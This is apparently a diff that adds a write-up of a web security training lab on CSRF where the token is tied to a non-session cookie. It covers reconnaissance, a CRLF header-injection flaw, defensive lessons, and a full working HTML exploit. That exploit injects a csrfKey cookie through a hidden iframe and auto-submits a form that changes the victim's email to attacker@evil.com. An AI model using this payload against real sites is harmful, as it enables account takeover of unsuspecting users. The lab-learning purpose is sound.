@@ -1,0 +1,85 @@
+================================
+LAB: CSRF where token is tied to non-session cookie
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 4, 2026
+Lab URL: https://0ab5009e04038da880a28ffc009c00cc.web-security-academy.net
+Category: Cross-Site Request Forgery (CSRF)
+Level: Practitioner
+Objective: Use exploit server to host HTML page that performs CSRF attack to change victim's email address
+Description: Email change functionality uses CSRF tokens but they aren't properly integrated with session handling system. Two test accounts provided: wiener:peter and carlos:montoya
+
+[RECONNAISSANCE]
+----------------
+Intercepted POST request to /my-account/change-email:
+- Cookie: session=<session_id>; csrfKey=<csrf_key>
+- Body: email=<email>&csrf=<csrf_token>
+
+Key observations:
+- Two separate cookies: session (user auth) and csrfKey (token validation)
+- CSRF token submitted in POST body
+- Search functionality at /?search=<query> sets cookie: Set-Cookie: LastSearchTerm=<query>
+
+Testing cross-account token usage:
+- Logged in as Carlos with his session cookie
+- Replaced csrfKey and csrf token with Wiener's values
+- Request succeeded → token validation not tied to session
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Server validates that csrf token matches csrfKey cookie but does NOT verify that csrfKey belongs to the active session. This allows an attacker to:
+1. Inject arbitrary csrfKey cookie into victim's browser
+2. Submit CSRF request with matching token
+
+Search parameter is vulnerable to HTTP header injection (CRLF):
+- /?search=test%0d%0aSet-Cookie:%20csrfKey=<value> 
+- Server reflects parameter value into response headers
+- Allows injection of arbitrary Set-Cookie headers
+
+[EXPLOITATION]
+--------------
+Generated valid csrfKey + csrf token pair from attacker-controlled session.
+
+Payload structure:
+1. Cookie injection via iframe loading search endpoint with CRLF injection
+2. Delayed form submission to ensure cookie is set before CSRF request
+
+Final exploit code:
+```html
+<html>
+  <body>
+    <iframe src="https://0ab5009e04038da880a28ffc009c00cc.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Sc7KeHtVKNN3yaSHlFdUG6JhyqNHSuIn;%20SameSite=None" style="display:none"></iframe>
+
+    <form id="csrf-form" action="https://0ab5009e04038da880a28ffc009c00cc.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@evil.com" />
+      <input type="hidden" name="csrf" value="N9ogf6KbQO4aAqUfZdGCfKUAABwqMeLr" />
+    </form>
+
+    <script>
+      setTimeout(function() {
+        document.getElementById('csrf-form').submit();
+      }, 500);
+    </script>
+  </body>
+</html>
+```
+
+Key elements:
+- %0d%0a = CRLF injection to break out of LastSearchTerm header
+- SameSite=None allows cookie to be sent cross-origin
+- 500ms delay ensures cookie is processed before form submission
+- Victim's session cookie automatically included in CSRF request
+
+[EVIDENCE]
+----------
+Lab marked as "Solved" after delivering exploit to victim. Victim's email successfully changed to attacker-controlled address using injected csrfKey and corresponding token.
+
+[LESSONS LEARNED]
+-----------------
+- CSRF tokens must be cryptographically tied to user sessions (stored server-side), not just validated against a separate cookie
+- Never reflect user input directly into HTTP response headers without strict validation
+- Cookie-based token validation is insufficient - creates a chicken-and-egg problem where attacker can inject both cookie and token
+- SameSite cookie attribute is critical defense but must be combined with proper token-session binding
+- Defense requires: token stored server-side + bound to session ID + validated on every state-changing request
